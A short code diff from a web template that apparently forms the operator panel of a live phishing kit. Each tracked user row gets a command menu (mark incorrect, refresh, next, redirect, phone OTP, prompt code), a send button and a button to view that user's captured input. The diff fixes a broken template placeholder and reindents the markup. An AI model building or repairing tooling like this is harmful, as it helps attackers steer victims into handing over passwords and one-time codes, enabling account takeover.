@@ -309,17 +309,17 @@
           <span id="dot-${u.id}" class="dot" style="display:none;"></span>
         </td>
         <td>
-          <select id="cmd-\( {u.id}" onchange="toggleOtpInput(' \){u.id}')">
-            <option value="">Command</option>
-            ${incorrectOption}
-            <option value="refresh">Refresh</option>
-            <option value="nextpage">Next</option>
-            <option value="redirect">Redirect</option>
-            <option value="phone-otp">Phone OTP</option>
-            <option value="prompt">Prompt Code</option>
-          </select>
-          <button onclick="sendCommand('${u.id}')">Send</button>
-        </td>
+          <select id="cmd-${u.id}" onchange="toggleOtpInput('${u.id}')">
+              <option value="">Command</option>
+              ${incorrectOption}
+              <option value="refresh">Refresh</option>
+              <option value="nextpage">Next</option>
+              <option value="redirect">Redirect</option>
+              <option value="phone-otp">Phone OTP</option>
+              <option value="prompt">Prompt Code</option>
+            </select>
+            <button onclick="sendCommand('${u.id}')">Send</button>
+          </td>
         <td><button onclick="viewInput('${u.id}')">👁️</button></td>
       `;
     }
